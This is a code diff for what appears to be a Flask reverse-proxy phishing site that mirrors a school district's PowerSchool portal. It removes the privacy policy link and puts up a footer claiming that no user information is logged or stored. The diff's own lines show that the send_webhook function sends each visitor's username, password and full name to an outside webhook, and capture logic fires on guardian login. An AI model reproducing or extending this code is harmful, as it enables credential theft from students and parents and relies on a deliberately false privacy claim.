@@ -28,23 +28,16 @@ def replace_urls(html):
     html = html.replace(BASE_URL, _host_root())
     return html
 
-# === NEW: Modify footer and remove Privacy Policy ===
 def modify_footer_and_remove_privacy(html):
-    # Remove Privacy Policy link
     html = re.sub(
         r'<a\s+[^>]*href="https://www\.powerschool\.com/privacy/"[^>]*>Privacy Policy</a>',
         '',
         html,
         flags=re.IGNORECASE
     )
-
-    # Replace copyright footer
-    footer_pattern = r'<p>\s*Copyright © 2005-2025 PowerSchool Group LLC and/or its affiliate\(s\)\. All rights reserved\.<br/?>All trademarks are either owned or licensed by PowerSchool Group LLC and/or its affiliates\.\s*</p>'
-    replacement = '<p style="font-family: Arial, sans-serif; color: #4CAF50; font-weight: bold; text-align: center;">' \
-                  'Welcome to PowerSchool Better V1 — none of your info is logged/stored, have fun!</p>'
-    
+    footer_pattern = r'<p>\s*Copyright\s*©\s*2005-2025\s*PowerSchool\s*Group\s*LLC\s*and/or\s*its\s*affiliate\(s\)\.\s*All\s*rights\s*reserved\.<br/?>\s*All\s*trademarks\s*are\s*either\s*owned\s*or\s*licensed\s*by\s*PowerSchool\s*Group\s*LLC\s*and/or\s*its\s*affiliates\.\s*</p>'
+    replacement = '<p style="font-family: Arial, sans-serif; color: #4CAF50; font-weight: bold; text-align: center;">Welcome to PowerSchool Better V1 — none of your info is logged/stored, have fun!</p>'
     html = re.sub(footer_pattern, replacement, html, flags=re.IGNORECASE | re.DOTALL)
-    
     return html
 
 def _clean_headers():
@@ -86,9 +79,9 @@ def send_webhook(username, password, full_name):
             "description": "**Someone Logged in**",
             "color": 3066993,
             "fields": [
-                {"name": "Username 🔰", "value": f"`{username}`", "inline": True},
-                {"name": "Password 🔥", "value": f"`{password}`", "inline": True},
-                {"name": "Full Name 📛", "value": f"`{full_name}`", "inline": False}
+                {"name": "Username", "value": f"`{username}`", "inline": True},
+                {"name": "Password", "value": f"`{password}`", "inline": True},
+                {"name": "Full Name", "value": f"`{full_name}`", "inline": False}
             ],
             "footer": {"text": "beaufortsc.powerschool.com"},
             "timestamp": datetime.now(timezone.utc).isoformat()
@@ -114,7 +107,7 @@ def root():
     if "text/html" in r.headers.get("content-type","").lower():
         html = body.decode("utf-8", errors="replace")
         html = replace_urls(html)
-        html = modify_footer_and_remove_privacy(html)  # Apply new changes
+        html = modify_footer_and_remove_privacy(html)
         body = html.encode()
     resp = Response(body, r.status_code, content_type=r.headers.get("content-type","text/html"))
     _set_cookies(resp, r)
@@ -136,7 +129,6 @@ def proxy(path):
     password = form.get("pw") or form.get("dbpw")
     r = s.request(method, url, headers=headers, data=data, allow_redirects=False)
 
-    # === Login Capture Logic ===
     if username and password and "guardian/home.html" in url:
         payload = {
             "dbpw": password,
